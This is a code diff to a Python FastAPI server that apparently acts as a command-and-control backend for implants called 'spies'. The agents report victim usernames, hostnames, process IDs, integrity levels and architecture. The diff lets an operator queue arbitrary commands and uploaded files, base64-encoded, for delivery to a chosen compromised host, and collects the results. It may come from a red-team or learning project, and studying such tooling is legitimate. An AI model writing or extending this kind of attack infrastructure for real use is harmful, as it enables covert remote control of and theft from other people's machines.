@@ -1,11 +1,11 @@
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, UploadFile, File, Form
 from pydantic import BaseModel
 import itertools
 import random
 import string
 from datetime import datetime
 import base64
-
+import json
 
 # Class for requests
 class RegisterRequest(BaseModel):
@@ -15,6 +15,10 @@ class RegisterRequest(BaseModel):
     hostname: str
     ops: str
     pid: int
+    processname: str
+    integritylevel: str
+    arch: str
+
 
 class BeaconRequest(BaseModel):
     id: int
@@ -50,8 +54,11 @@ class Spy:
         self.firstcheckin = None
         self.lastcheckin = None
         self.missionlist = []
+        self.processname = None
+        self.integritylevel = None
+        self.arch = None
 
-    def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid):
+    def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid, processname, integritylevel, arch):
         self.active = True
         self.intaddr = intaddr
         self.extaddr = extaddr
@@ -61,7 +68,8 @@ class Spy:
         self.pid = pid
         self.firstcheckin = datetime.now()
         self.lastcheckin = self.firstcheckin
-        self.output = ""
+        self.processname = processname
+        self.integritylevel = integritylevel
 
     def checkin(self):
         self.lastcheckin = datetime.now()
@@ -81,10 +89,11 @@ class Operator:
 
 class Mission:
     newId = itertools.count(start=1)
-    def __init__(self, spyid, command):
+    def __init__(self, spyid, command, artifact):
         self.id = next(self.newId)
         self.spyid = spyid
         self.command = command
+        self.artifact = artifact
         self.iscompleted = False
         self.output = ""
         self.isviewed = False
@@ -105,7 +114,7 @@ app = FastAPI()
 @app.post("/register")
 async def register(request: RegisterRequest):
     newspy = Spy()
-    newspy.initial_checkin(request.intaddr, request.extaddr, request.username, request.hostname, request.ops, request.pid)
+    newspy.initial_checkin(request.intaddr, request.extaddr, request.username, request.hostname, request.ops, request.pid, request.processname, request.integritylevel, request.arch)
     spies.append(newspy)
     return newspy.__dict__
 
@@ -129,17 +138,27 @@ async def list_spies():
 
 
 @app.post("/mission/{spy_id}")
-async def receive_mission(spy_id: int, request: MissionRequest):
+async def receive_mission(spy_id: int, json_data: str = Form(...), file: UploadFile = None):
     spy = next((s for s in spies if s.id == spy_id), None)
     if spy:
-        m = Mission(spy_id, request.command)
+        try:
+            data = json.loads(json_data)
+            command = data['command']
+        except json.JSONDecodeError:
+            raise HTTPException(status_code=400, detail="Invalid JSON format")
+        content = b""
+        if file:
+            filename = file.filename
+            content = await file.read()
+        artifact = base64.b64encode(content).decode("utf-8")  
+        m = Mission(spy_id, command, artifact)
         spy.missionlist.insert(0,m)        
         return m.__dict__
     raise HTTPException(status_code=404, detail="Spy not found")
 
 
 @app.get("/spy/{spy_id}")
-async def receive_mission(spy_id: int):
+async def check_in(spy_id: int):
     spy = next((s for s in spies if s.id == spy_id), None)
     if spy:
         spy.lastcheckin = datetime.now()
@@ -155,6 +174,7 @@ async def update_output(spy_id: int, mission_id: int, request: MissionUpdateRequ
         if mission:
             mission.output = request.output
             mission.iscompleted = True
+            mission.artifact = "Cleared"
             return {"message": "Updated output successfully"}
     raise HTTPException(status_code=404, detail="Spy not found")
 
